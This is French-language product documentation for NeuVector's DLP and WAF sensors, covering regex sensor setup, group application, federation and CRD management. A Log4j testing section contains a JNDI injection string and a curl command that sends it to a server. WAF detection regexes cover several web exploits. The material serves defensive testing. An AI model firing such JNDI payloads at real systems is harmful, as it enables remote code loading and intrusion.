= Capteurs DLP et WAF
:revdate: 2025-05-05
:page-revdate: {revdate}
:page-opendocs-origin: /05.policy/09.dlp/09.dlp.md
:page-opendocs-slug:  /politique/dlp

== Prévention de la perte de données (DLP) et pare-feu d'application Web (WAF)

DLP et WAF utilisent l'inspection approfondie des paquets (DPI) de {product-name} pour inspecter les charges utiles du réseau des connexions afin de détecter les violations de données sensibles. {product-name} utilise un moteur basé sur les expressions régulières (regex) pour effectuer les fonctions de filtrage des paquets. Il convient d'être extrêmement prudent lors de l'application de capteurs au trafic des conteneurs, car la fonction de filtrage entraîne une surcharge supplémentaire du système et peut avoir un impact sur les performances de l'hôte.

Les filtres DLP et WAF sont appliqués différemment selon le(s) groupe(s) auquel (auxquels) ils s'appliquent. En général, le filtrage WAF est appliqué aux connexions entrantes et sortantes, sauf pour le trafic interne où seul le filtrage entrant est appliqué. Le filtrage DLP s'applique aux connexions entrantes et sortantes d'un "domaine de sécurité", mais pas aux connexions internes au sein d'un domaine de sécurité. Voir les descriptions détaillées ci-dessous.

La configuration d'un DLP ou d'un WAF se fait en deux étapes :

. Définir et tester le(s) capteur(s), c'est-à-dire l'ensemble des expressions régulières utilisées pour faire correspondre l'en-tête, l'URL ou le paquet entier.
. Appliquez le capteur souhaité à un groupe, dans l'écran Policy -> Groups.

=== Capteurs WAF

Les capteurs WAF représentent l'inspection du trafic réseau vers/depuis un pod/conteneur. Ces capteurs peuvent être appliqués à n'importe quel groupe applicable, même aux groupes personnalisés (par exemple, les groupes d'espaces de noms). Le trafic entrant vers TOUS les conteneurs du groupe sera inspecté pour détecter les règles WAF. En outre, toutes les connexions sortantes (egress) externes au cluster seront inspectées.

Cela signifie que, bien que cette fonction soit appelée WAF, elle est utile et applicable à tout trafic réseau, et pas seulement au trafic des applications web, et offre donc des protections plus larges que les simples WAF. Par exemple, la sécurité de l'API peut être appliquée aux connexions sortantes vers un service d'API externe, en autorisant uniquement les requêtes GET et en bloquant les POST.

Notez également que, bien que similaire à la DLP, l'inspection concerne le trafic entrant dans CHAQUE pod/conteneur au sein du groupe, alors que la DLP applique l'inspection au trafic entrant et sortant du groupe uniquement (c'est-à-dire la frontière de sécurité), et non au trafic interne du groupe (par exemple, pas dans le sens est-ouest au sein des conteneurs d'un groupe).

image:waf_sensors.png[waf]

=== Capteurs DLP

Les capteurs DLP sont les modèles utilisés pour inspecter le trafic. Les capteurs intégrés tels que la carte de crédit et la sécurité sociale américaine ont des expressions régulières prédéfinies. Vous pouvez ajouter des capteurs personnalisés en définissant des modèles de regex à utiliser dans ce capteur. Notez que, bien que similaire au WAF, la DLP applique l'inspection au trafic entrant et sortant du groupe uniquement (c'est-à-dire la frontière de sécurité), et non au trafic interne du groupe (par exemple, pas d'est en ouest à l'intérieur des conteneurs d'un groupe). L'inspection WAF ne concerne que le trafic entrant dans CHAQUE pod/conteneur du groupe.

image:sensors.png[dlp]

=== Configuration des capteurs DLP et WAF

La configuration des capteurs DLP et WAF est similaire. Créez un nom de capteur et un commentaire, puis sélectionnez le capteur pour ajouter ou modifier les règles le concernant. Les domaines clés sont les suivants :

* Avoir/Non avoir. Détermine si la correspondance exige que le motif soit trouvé (Have) pour que l'action soit prise (par exemple, Deny), ou si l'action ne doit être prise que si le motif n'existe pas (Not Have). Il est recommandé de combiner l'opérateur "Ne pas avoir" dans la règle avec un modèle utilisant l'opérateur "Avoir", car un modèle unique avec l'opérateur "Ne pas avoir" ne sera pas efficace.
* Modèle. Il s'agit de l'expression régulière utilisée pour déterminer une correspondance. Vous pouvez tester votre expression rationnelle à l'aide d'un échantillon de données afin de vous assurer que les résultats sont corrects.
* Contexte. Où chercher la correspondance du modèle. Choisissez le paquet pour l'inspection la plus large de l'ensemble de la connexion réseau, ou restreignez l'inspection à l'URL, à l'en-tête ou au corps du message uniquement.

image:5_sensor_config.png[waf]

Chaque règle DLP/WAF prend en charge plusieurs modèles (16 modèles au maximum sont autorisés par règle). L'utilisation de modèles multiples et la définition du contexte de la règle peuvent également contribuer à réduire le nombre de faux positifs.

Exemple de règle DLP avec un modèle Have/Not Have (avoir/non avoir) :
Avoir :

[,shell]
----
\b3[47]\d{2}([ -]?)(?!(\d)\2{5}|123456|234567|345678)\d{6}\1(?!(\d)\3{4}|12345|56789)\d{5}\b
----

Cela produit une correspondance faussement positive pour "istio_agent_go_gc_duration_seconds_sum 22.378386247999998" :

[,shell]
----
docker exec -ti httpclient sh
/ # curl -d "{\"context\": \"istio_agent_go_gc_duration_seconds_sum 22.378386247999998\"}" 172.17.0.5:8080/
Hello, world!
----

L'ajout d'un motif "Ne pas avoir" supprime le faux positif :

[,shell]
----
istio\_(\w){5}
----

*_Les capteurs doivent être appliqués à un groupe pour être efficaces._*

=== Configuration des capteurs DLP et WAF fédérés

Il s'agit du processus général de configuration d'un capteur DLP ou WAF fédéré :

. Définissez et testez le(s) capteur(s) DLP/WAF fédéré(s), c'est-à-dire l'ensemble des expressions régulières utilisées pour faire correspondre l'en-tête, l'URL ou le paquet entier dans le **cluster primaire -> Federated Policy -> DLP Sensors or WAF Sensors** tab.
. Appliquez le capteur souhaité à un groupe fédéré personnalisé dans l'onglet **Groupes de la stratégie fédérée -> **.
. Vérifiez que le(s) capteur(s) DLP/WAF fédéré(s) est/sont synchronisé(s) avec le cluster géré et qu'il(s) fonctionne(nt) comme prévu.

==== Exemple

Définissez un ou plusieurs capteurs DLP/WAF fédérés dans un cluster primaire et appliquez-les à un groupe fédéré personnalisé, puis vérifiez que ces capteurs sont appliqués à tous les clusters gérés.

Les étapes :

. Définissez le(s) capteur(s) DLP/WAF fédéré(s) dans le cluster primaire dans l'onglet **Capteurs DLP** ou **Capteurs WAF** correspondant :
+
image:federated_1.png[WAF fédéré]
+
image:federated_2.png[Federated DLP]

. Appliquez le(s) capteur(s) DLP/WAF fédéré(s) à un groupe fédéré personnalisé dans l'onglet **Groupes de la stratégie fédérée -> **:
+
image:federated_3.png[Groupe fédéré sur mesure]

. Vérifiez que le(s) capteur(s) DLP/WAF fédéré(s) est/sont synchronisé(s) avec les clusters gérés :
+
image:federated_4.png[WAF fédéré]
+
image:federated_5.png[Federated DLP]

. Dans les clusters gérés, les conteneurs envoient du trafic qui correspond au modèle de capteur(s) DLP/WAF fédéré(s) :
+
image:federated_6.png[Trafic de conteneurs fédérés]

. Après l'étape 4, des notifications d'"événements de sécurité" DLP/WAF sont générées :
+
image:federated_7.png[Génération de notifications de sécurité DLP/WAF]

=== Application des capteurs DLP/WAF aux groupes de conteneurs

Pour activer un capteur DLP ou WAF, allez sur Policy -> Groups pour sélectionner le groupe souhaité. Activez DLP/WAF pour le groupe et ajoutez le(s) capteur(s).

Il est recommandé d'appliquer les capteurs DLP à la limite d'une zone de sécurité, définie par un groupe, afin de minimiser l'impact de l'inspection DLP. Si nécessaire, définissez un groupe personnalisé qui représente une telle zone de sécurité.  Par exemple, si le groupe sélectionné est le groupe réservé "conteneurs" et que des capteurs DLP sont ajoutés au groupe, seul le trafic entrant ou sortant du cluster et non entre tous les conteneurs sera inspecté. S'il s'agit d'un groupe personnalisé défini comme "namespace=demo", seul le trafic entrant ou sortant de l'espace de noms demo sera inspecté, mais pas le trafic entre conteneurs à l'intérieur de l'espace de noms.

Il est recommandé de n'appliquer les capteurs WAF qu'aux groupes où des connexions entrantes (par ex. ingress) sont attendues, à moins que le(s) capteur(s) ne s'applique(nt) à des applications internes spécifiques (s'attendant à un trafic est-ouest).

image:apply_dlp_group.png[groupe]

==== Résumé des comportements DLP/WAF

* La correspondance des modèles DLP ne se produit pas pour le trafic qui passe entre les charges de travail qui appartiennent au même groupe DLP.
* Tout le trafic entrant et sortant d'un groupe DLP est analysé à la recherche de correspondances.
* Le trafic entrant et sortant du cluster est analysé à la recherche de modèles si la charge de travail est autorisée à établir des connexions entrantes et sortantes.
* Plusieurs modèles par règle DLP/WAF (16 modèles maximum sont autorisés par règle).
* Plusieurs alertes sont générées pour un seul paquet s'il correspond à plusieurs règles.
* Pour des raisons de performance, seules les 16 premières règles font l'objet d'une alerte et d'une correspondance, même si le paquet correspond à plus de 16 règles.
* Les alertes sont regroupées et signalées ensemble si la même règle s'applique et si des alertes sont émises plusieurs fois en l'espace de 2 secondes.
* PCRE est utilisé pour la recherche de motifs.
* La bibliothèque Hyper scan est utilisée pour une recherche de motifs efficace, évolutive et performante.

=== Actions DLP/WAF en modes découverte, surveillance et protection

Lors de l'ajout de capteurs à des groupes, l'action DLP/WAF peut être définie sur Alerte ou Refus, avec le comportement suivant en cas de correspondance :

* Mode découverte. L'action sera toujours d'alerter, quel que soit le réglage Alerte/Désistement.
* Mode moniteur. L'action sera toujours d'alerter, quel que soit le réglage Alerte/Désistement.
* Mode de protection. L'action sera d'alerter si elle est définie sur Alert, ou de bloquer si elle est définie sur Deny.

=== Détection de Log4j Modèle WAF

La règle de type WAF permettant de détecter la tentative d'exploitation de Log4j est présentée ci-dessous. Veuillez noter que cela ne doit être appliqué qu'aux groupes qui attendent des connexions web entrantes.

[,shell]
----
\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
----

Notez également qu'il existe des moyens pour les attaquants de contourner la détection de ces règles.

=== Test de la détection du WAF Log4j

Lors d'une tentative d'exploitation, l'attaquant construira une insertion initiale jndi : et l'inclura dans l'en-tête HTTP User-Agent :

[,shell]
----
User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}
----

L'utilisation de curl pour envoyer des données au serveur (conteneur) peut aider à tester les règles du WAF :

[,shell]
----
curl -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
----

=== Configuration et test du WAF

Le fichier téléchargeable ci-dessous fournit un script non pris en charge permettant de créer des capteurs WAF via CRD et d'exécuter des tests de règles WAF communs sur ces capteurs. Le README fournit des instructions pour l'exécuter.

xref:attachment$waf_test.zip[Télécharger le script de test WAF]

=== Exemples d'alertes

==== Correspondance DLP en mode découverte ou surveillance

image:dlp4_alert_discover.png[DLPAlert]

==== Correspondance DLP en mode protection

image:dlp_5_protect.png[DLPProtect]

==== Notification d'événement de sécurité DLP en cas de correspondance de cartes de crédit

image:dlp6_credit.png[DLPCredit]

[NOTE]
====
La capture automatisée de paquets contiendra le paquet réel, y compris le numéro de carte de crédit correspondant. Il en va de même pour toute capture de paquets DLP concernant des données sensibles.
====

== Gestion des règles WAF à l'aide d'importations/exportations ou de CRDs

Il est possible d'importer ou d'exporter des règles WAF à partir de l'écran WAF. Cela peut s'avérer utile pour propager les règles vers d'autres clusters, effectuer une sauvegarde ou les préparer à être appliquées en tant que CRD.

Pour créer des capteurs WAF ou appliquer un capteur WAF à un groupe à l'aide de CRD, assurez-vous que la liaison de rôle de cluster NVWafSecurityRule appropriée est créée.

Échantillon Capteur WAF CRD

.Cliquez ici pour plus d'informations
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvWafSecurityRule
  metadata:
    name: sensor.execution
  spec:
    sensor:
      comment: arbitrary command execution attempt
      name: sensor.execution
      rules:
      - name: Alchemy
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/NUL\/.*\.\.\/\.\.\/
      - name: Log4j
        patterns:
        - context: header
          key: pattern
          op: regex
          value: \$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
      - name: formmail
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/formmail
        - context: packet
          key: pattern
          op: regex
          value: \x0a
      - name: CCBill
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whereami\.cgi?.*g=
      - name: DotNetNuke
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Install\/InstallWizard.aspx.*executeinstall
      - name: HNAP
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/tmUnblock.cgi
        - context: header
          key: pattern
          op: regex
          value: 'Authorization: Basic\s*YWRtaW46'
      - name: Magento
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Adminhtml_.*forwarded=
      - name: b2
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/b2\/b2-include\/.*b2inc.*http\x3a\/\/
      - name: bat
        patterns:
        - context: url
          key: pattern
          op: regex
          value: x2ebat\x22.*?\x26
      - name: eshop.pl
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/eshop\.pl?.*seite=\x3b
      - name: whois_raw.cgi
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whois_raw\.cgi?
        - context: packet
          key: pattern
          op: regex
          value: \x0a
kind: List
metadata: null
----
====

Exemple de CRD pour appliquer un capteur WAF à un groupe

.Cliquez ici pour plus d'informations
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvSecurityRule
  metadata:
    name: demo-group
    namespace: demo
  spec:
    egress: []
    file: []
    ingress: []
    process: []
    process_profile:
      baseline: default
    target:
      policymode: N/A
      selector:
        comment: ""
        criteria:
        - key: domain
          op: =
          value: demo
        - key: service
          op: =
          value: nginx-pod.demo
        - key: service
          op: =
          value: node-pod.demo
        name: demo-group
        original_name: ""
    waf:
      settings:
      - action: deny
        name: sensor.cross
      - action: deny
        name: sensor.execution
      - action: deny
        name: sensor.injection
      - action: deny
        name: sensor.traversal
      - action: deny
        name: wafsensor-1
      status: true
kind: List
metadata: null
----
====

Voir la xref:usingcrd.adoc[section CRD] pour plus de détails sur le travail avec les CRD.

== Règles de réponse DLP/WAF

Les règles de réponse basées sur les événements de sécurité DLP/WAF peuvent être créées dans Policy ->Response Rules. Commencez par le type DLP ou WAF et la liste déroulante énumérera tous les capteurs et modèles disponibles pour créer des règles.

image:dlp7_response.png[DLPResponse]
